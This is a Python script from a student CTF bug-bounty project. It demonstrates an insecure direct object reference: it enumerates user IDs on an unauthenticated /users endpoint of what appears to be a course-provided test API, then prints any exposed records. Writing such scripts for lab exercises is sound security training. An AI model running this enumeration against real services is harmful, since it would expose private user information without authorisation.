
#  COMP2152 — Term Project: CTF Bug Bounty
#  Vulnerability: IDOR — Insecure Direct Object Reference
#  Author: Kerem
#  Branch: kerem_idor_users
#
#  Description:
#    api.0x10.cloud exposes a /users?id=X endpoint that returns
#    user data without any authentication. By incrementing the
#    id parameter, any attacker can enumerate all user accounts
#    and access private user information freely.


import urllib.request
import urllib.error
import json
import time

BASE = "http://api.0x10.cloud"

print("=" * 55)
print("  SCAN: IDOR — /users?id=X Enumeration")
print("  Target: api.0x10.cloud")
print("  Author: Kerem")
print("=" * 55)

# Step 1: Check what endpoints are exposed
print("\n[STEP 1] Checking exposed API endpoints...")
try:
    r = urllib.request.urlopen(BASE + "/", timeout=5)
    data = json.loads(r.read().decode())
    print(f"  Exposed endpoints: {data.get('endpoints', [])}")
    print(f"  Service version : {data.get('version', '?')}")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(0.15)

# Step 2: Try IDOR on /users?id=X
print("\n[STEP 2] Enumerating users via IDOR...")
found_users = []

for user_id in range(1, 11):
    url = f"{BASE}/users?id={user_id}"
    try:
        r = urllib.request.urlopen(url, timeout=5)
        content = r.read().decode(errors="ignore")
        print(f"  [HTTP {r.status}] /users?id={user_id} → {content[:200]}")
        found_users.append((user_id, content))

    except urllib.error.HTTPError as e:
        content = e.read().decode(errors="ignore")
        print(f"  [HTTP {e.code}] /users?id={user_id} → {content[:100]}")
    except Exception as e:
        print(f"  [ERROR] /users?id={user_id} → {e}")

    time.sleep(0.15)

# Step 3: Check other endpoints
print("\n[STEP 3] Checking other API endpoints...")
endpoints = ["/status", "/auth/verify", "/auth/login"]
for ep in endpoints:
    url = BASE + ep
    try:
        r = urllib.request.urlopen(url, timeout=5)
        content = r.read().decode(errors="ignore")
        print(f"  [HTTP {r.status}] {ep} → {content[:150]}")
    except urllib.error.HTTPError as e:
        content = e.read().decode(errors="ignore")
        print(f"  [HTTP {e.code}] {ep} → {content[:100]}")
    except Exception as e:
        print(f"  [ERROR] {ep} → {e}")
    time.sleep(0.15)

print()
print("=" * 55)
print("RESULTS")
print("=" * 55)

if found_users:
    print(f"\nUSERS EXPOSED VIA IDOR: {len(found_users)}")
    for uid, data in found_users:
        print(f"  id={uid}: {data[:150]}")
    print()
    print("VULNERABILITY CONFIRMED — IDOR on /users?id=X:")
    print("  No authentication required to access user data.")
    print("  Any attacker can enumerate all users by incrementing")
    print("  the id parameter — leaking names, emails, roles.")
    print("  This violates user privacy and enables targeted attacks.")
else:
    print("No IDOR vulnerability confirmed.")